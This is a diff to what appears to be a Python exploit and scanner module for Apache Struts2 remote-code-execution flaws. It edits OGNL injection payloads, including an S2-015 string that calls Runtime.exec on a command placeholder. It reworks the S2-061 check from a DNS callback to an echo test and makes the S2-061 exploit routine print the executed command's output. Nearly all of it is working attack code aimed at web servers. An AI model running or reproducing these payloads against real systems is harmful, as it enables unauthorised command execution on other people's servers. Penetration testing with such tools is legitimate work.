@@ -1,5 +1,6 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
+import re
 import http.client
 import base64
 from thirdparty import requests
@@ -59,7 +60,7 @@ class ApacheStruts2():
                               'ing(%23d))%2C%23out.close()%7D'
         self.payload_s2_015 = r"/${%23context['xwork.MethodAccessor.denyMethodExecution']=false,%23f=%23_memberAcces" \
                               r"s.getClass().getDeclaredField('allowStaticMethodAccess'),%23f.setAccessible(true),%23f.set(%23_memberA" \
-                              r"ccess, true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInp" \
+                              r"ccess, true),@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('RECOMMAND').getInp" \
                               r"utStream())}.action"
         self.payload_s2_016_1 = r"?redirect:${%23req%3d%23context.get(%27co%27" \
                                 r"%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atc" \
@@ -423,7 +424,7 @@ class ApacheStruts2():
             if md in misinformation(self.req.text, md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
-                self.vul_info["vul_payd"] = self.payload
+                self.vul_info["vul_payd"] = self.payload_1
                 self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
@@ -799,18 +800,19 @@ class ApacheStruts2():
                                     " may lead to remote code execution."
         self.vul_info["cre_date"] = "2021-01-30"
         self.vul_info["cre_auth"] = "zhzyker"
-        md = dns_request()
-        cmd = "ping " + md
+        md = random_md5()
+        cmd = "echo " +  md
         self.payload = self.payload_s2_061.replace("RECOMMAND", cmd)
         if r"?" not in self.url:
-            self.url_061 = self.url + "?id="
+            self.url_061 = self.url + "/?id="
         try:
             self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            if dns_result(md):
+            req = re.findall(r'<a id="(.*)', self.req.text)[0]
+            if misinformation(req, md):
                 self.vul_info["vul_data"] = dump.dump_all(self.req).decode('utf-8', 'ignore')
                 self.vul_info["prt_resu"] = "PoCSuCCeSS"
                 self.vul_info["vul_payd"] = self.payload
-                self.vul_info["prt_info"] = "[dns] [cmd: " + cmd + "]"
+                self.vul_info["prt_info"] = "[rce] [cmd: " + cmd + "]"
             verify.scan_print(self.vul_info)
         except requests.exceptions.Timeout:
             verify.timeout_print(self.vul_info["prt_name"])
@@ -1082,12 +1084,11 @@ class ApacheStruts2():
         vul_name = "Apache Struts2: S2-061"
         self.payload = self.payload_s2_061.replace("RECOMMAND", cmd)
         if r"?" not in self.url:
-            self.url_061 = self.url + "?id="
+            self.url_061 = self.url + "/?id="
         try:
             self.req = requests.get(self.url_061 + self.payload, headers=self.headers, timeout=self.timeout, verify=False)
-            r = "Command Executed Successfully (But No Echo)"
             self.raw_data = dump.dump_all(self.req).decode('utf-8', 'ignore')
-            verify.exploit_print(r, self.raw_data)
+            verify.exploit_print(self.req.text, self.raw_data)
         except requests.exceptions.Timeout:
             verify.timeout_print(vul_name)
         except requests.exceptions.ConnectionError:
